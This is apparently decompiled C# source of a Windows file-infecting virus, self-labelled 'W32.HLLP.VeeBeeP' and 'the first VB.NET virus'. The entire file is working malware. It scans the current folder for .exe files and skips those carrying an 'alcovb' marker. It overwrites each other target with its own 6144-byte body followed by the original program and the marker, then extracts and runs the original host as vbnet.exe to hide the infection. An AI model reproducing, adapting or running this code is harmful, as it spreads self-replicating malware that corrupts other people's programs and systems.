using System;
using System.Collections;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Helpers;

[StandardModule]
internal sealed class Virus
{
	[STAThread]
	public static void Main()
	{
		//IL_01dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		string text = FileSystem.Dir(FileSystem.CurDir() + "\\*.exe", (FileAttribute)0);
		string text2 = default(string);
		while (StringType.StrCmp(text, "", false) != 0)
		{
			text2 = text2 + text + "/";
			text = FileSystem.Dir();
		}
		string[] array = Strings.Split(text2, "/", -1, (CompareMethod)0);
		IEnumerator enumerator = array.GetEnumerator();
		checked
		{
			while (enumerator.MoveNext())
			{
				string text3 = StringType.FromObject(enumerator.Current);
				if (StringType.StrCmp(Strings.LCase(text3), Strings.LCase(module.Name), false) == 0)
				{
					continue;
				}
				if (StringType.StrCmp(text3, "", false) != 0)
				{
					object obj = new FileStream(text3, FileMode.Open, FileAccess.Read);
					BinaryReader binaryReader = new BinaryReader((Stream)obj);
					binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
					byte[] array2 = new byte[85];
					int num = 84;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = binaryReader.Read(array2, num2, num);
						if (num3 == 0)
						{
							break;
						}
						num2 += num3;
						num -= num3;
					}
					binaryReader.Close();
					FileSystem.FileOpen(1, "sig.txt", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					FileSystem.FilePut(1, (Array)array2, -1, false, false);
					FileSystem.FileClose(new int[1] { 1 });
					FileSystem.FileOpen(1, "sig.txt", (OpenMode)1, (OpenAccess)(-1), (OpenShare)(-1), -1);
					string text4 = FileSystem.LineInput(1);
					FileSystem.FileClose(new int[1] { 1 });
					FileSystem.Kill("sig.txt");
					string text5 = Strings.Mid(Strings.Right(text4, 7), 1, Strings.Len(Strings.Right(text4, 7)) - 1);
					if (StringType.StrCmp(Strings.LCase(text5), "alcovb", false) == 0)
					{
						continue;
					}
					try
					{
						infect(text3);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				Interaction.MsgBox((object)"the first VB.NET virus", (MsgBoxStyle)0, (object)"W32.HLLP.VeeBeeP by alcopaul");
				Interaction.Beep();
				break;
			}
			try
			{
				object obj2 = new FileStream(module.FullyQualifiedName, FileMode.Open, FileAccess.Read);
				BinaryReader binaryReader2 = new BinaryReader((Stream)obj2);
				int num4 = IntegerType.FromObject(ObjectType.SubObj(LateBinding.LateGetNoByRef(obj2, (Type)null, "Length", new object[0], (string[])null), (object)6145));
				binaryReader2.BaseStream.Seek(6145L, SeekOrigin.Begin);
				byte[] array3 = new byte[num4 + 1];
				int num5 = num4;
				int num6 = 0;
				while (num5 > 0)
				{
					int num7 = binaryReader2.Read(array3, num6, num5);
					if (num7 == 0)
					{
						break;
					}
					num6 += num7;
					num5 -= num7;
				}
				binaryReader2.Close();
				FileSystem.FileOpen(1, "vbnet.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, (Array)array3, -1, false, false);
				FileSystem.FileClose(new int[1] { 1 });
				Interaction.Shell("vbnet.exe " + Interaction.Command(), (AppWinStyle)1, false, -1);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Interaction.MsgBox((object)"first generation", (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
			do
			{
				IL_02ed:
				try
				{
					File.Delete("vbnet.exe");
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					goto IL_02ed;
				}
			}
			while (File.Exists("vbnet.exe"));
		}
	}

	public static object infect(string fff)
	{
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		object obj = new FileStream(module.FullyQualifiedName, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader((Stream)obj);
		binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] array = new byte[6145];
		int num = 6144;
		int num2 = 0;
		checked
		{
			while (num > 0)
			{
				int num3 = binaryReader.Read(array, num2, num);
				if (num3 == 0)
				{
					break;
				}
				num2 += num3;
				num -= num3;
			}
			binaryReader.Close();
			object obj2 = new FileStream(fff, FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader2 = new BinaryReader((Stream)obj2);
			long num4 = LongType.FromObject(LateBinding.LateGetNoByRef(obj2, (Type)null, "Length", new object[0], (string[])null));
			binaryReader2.BaseStream.Seek(0L, SeekOrigin.Begin);
			byte[] array2 = new byte[(int)num4 + 1];
			int num5 = IntegerType.FromObject(LateBinding.LateGetNoByRef(obj2, (Type)null, "Length", new object[0], (string[])null));
			int num6 = 0;
			while (num5 > 0)
			{
				int num7 = binaryReader2.Read(array2, num6, num5);
				if (num7 == 0)
				{
					break;
				}
				num6 += num7;
				num5 -= num7;
			}
			binaryReader2.Close();
			FileSystem.FileOpen(1, fff, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
			FileSystem.FilePut(1, (Array)array, -1, false, false);
			FileSystem.FilePut(1, (Array)array2, -1, false, false);
			FileSystem.FilePut(1, "alcovb", -1, false);
			FileSystem.FileClose(new int[1] { 1 });
			object result = default(object);
			return result;
		}
	}
}
